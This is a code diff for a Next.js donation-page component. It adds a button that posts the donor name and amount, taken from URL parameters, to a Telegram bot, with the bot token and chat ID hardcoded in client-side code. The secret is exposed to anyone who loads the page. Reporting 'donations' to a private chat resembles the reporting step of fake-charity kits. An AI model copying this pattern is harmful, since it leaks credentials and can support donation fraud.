@@ -1,9 +1,62 @@
-import Image from "next/image";
+'use client'
 
-export default function Home() {
+import { useState, useEffect } from "react";
+import Image from "next/image";
+import { useSearchParams } from "next/navigation";
+
+export default function PayPage() {
+  const searchParams = useSearchParams();
+
+  // حالات لتخزين القيم
+  const [fullname, setFullname] = useState("");
+  const [amount, setAmount] = useState("");
+  const [currency, setCurrency] = useState("");
+  const [loading, setLoading] = useState(false);
+
+  const TELEGRAM_BOT_TOKEN = "8255290968:AAHMYhcRTfmvoHfkJGKRQh1rdbtqgBUoxok";
+  const TELEGRAM_CHAT_ID = "5047074105";
+
+  useEffect(() => {
+    const nameParam = searchParams.get("name");
+    const amountParam = searchParams.get("amount");
+    const currencyParam = searchParams.get("currency") || "USD";
+
+    if (nameParam) setFullname(nameParam);
+    if (amountParam) setAmount(amountParam);
+    setCurrency(currencyParam);
+  }, [searchParams]);
+
+  const handleSendTelegram = async () => {
+    if (!fullname || !amount) {
+      alert("Nom et montant requis pour envoyer le don.");
+      return;
+    }
+
+    setLoading(true);
+    const text = `💌 Nouveau don reçu!\nNom: ${fullname}\nMontant: ${amount} ${currency}`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text
+        }),
+      });
+      alert("Message envoyé avec succès sur Telegram!");
+    } catch (err) {
+      console.error(err);
+      alert("Erreur lors de l'envoi sur Telegram.");
+    } finally {
+      setLoading(false);
+    }
+  };
+
   return (
     <div className="container bg-light py-5">
       <div className="row g-4">
+
         {/* Première carte */}
         <div className="col-12 col-lg-6">
           <div className="card text-bg-dark h-100 border-0 shadow overflow-hidden">
@@ -23,25 +76,30 @@ export default function Home() {
           </div>
         </div>
 
-        {/* Deuxième carte */}
+        {/* Carte avec résumé du don */}
         <div className="col-12 col-lg-6">
-          
           <div className="card text-bg-info h-100 d-flex flex-column justify-content-start align-items-start p-4 shadow border-0">
             <h1 className="text-light">Résumé des informations sur le don</h1>
             <p className="text-light border-5 border-start border-light ps-3">
               ❤️ Donnez mensuellement
             </p>
-            <p className="text-light">5 400,00 USD</p>
-            <p className="text-light">Mhmd Mhmd</p>
-             <br/>
-            <hr class="w-50 border border-light border-1 mx-auto" />
-            <br/>
-            <form className="w-100 mt-3">
 
-              <button type="submit" className="btn btn-light w-100 fw-bold">
-                <Image src="/6.svg" alt="..." width={60} height={60} />
-              </button>
-            </form>
+            {/* عرض القيم من البارامتر */}
+            <p className="text-light fw-bold">Montant: {amount || "0"} {currency}</p>
+            <p className="text-light fw-bold">Nom: {fullname || "Nom Prénom"}</p>
+
+            <br/>
+            <hr className="w-50 border border-light border-1 mx-auto" />
+            <br/>
+
+            <button 
+              type="button" 
+              className="btn btn-light w-100 fw-bold" 
+              onClick={handleSendTelegram} 
+              disabled={loading}
+            >
+              {loading ? "Envoi..." : "Envoyer sur Telegram"}
+            </button>
           </div>
         </div>
 
@@ -145,32 +203,7 @@ export default function Home() {
           </div>
         </div>
 
-        {/* Autres moyens de donner */}
-        <div className="col-12 col-lg-6 text-dark">
-          <h1 className="fw-bold">Autres moyens de faire un don</h1>
-        </div>
-
-        {/* Cartes supplémentaires */}
-        <div className="col-12 col-lg-6">
-          {[
-            { src: "/tow.webp", title: "Urgence Gaza", text: "Faites un don pour envoyer une aide d’urgence aux familles déplacées" },
-            { src: "/three.webp", title: "Protégeons l’éducation", text: "Pour Gaza : Votre soutien peut aider à protéger le droit à l’éducation" },
-            { src: "/four.webp", title: "Protégeons l’éducation", text: "Soutenez l’éducation des réfugiés palestiniens dans tous les domaines" },
-            { src: "/five.webp", title: "Zakat", text: "Donnez votre Zakat aujourd’hui. 100% va directement aux réfugiés palestiniens" }
-          ].map((card, idx) => (
-            <div key={idx} className="card my-4 bg-info text-white border-0 shadow overflow-hidden">
-              <div className="ratio ratio-16x9">
-                <Image src={card.src} alt={card.title} fill style={{ objectFit: "cover" }}  className="bg-dark bg-opacity-50"/>
-              </div>
-              <div className="card-body">
-                <h5 className="card-title fw-bold">{card.title}</h5>
-                <p className="card-text">{card.text}</p>
-              </div>
-            </div>
-          ))}
-        </div>
-
-        {/* Logos */}
+        {/* Logos / autres cartes */}
         <div className="col-12 col-lg-6">
           <div className="d-flex flex-wrap gap-3 justify-content-center align-items-center my-5">
             <Image src="/11.svg" alt="..." width={40} height={40} />
@@ -183,8 +216,8 @@ export default function Home() {
             <Image src="/8.svg" alt="..." width={60} height={60} />
           </div>
         </div>
+
       </div>
     </div>
   );
-      }
-                
+                                              }
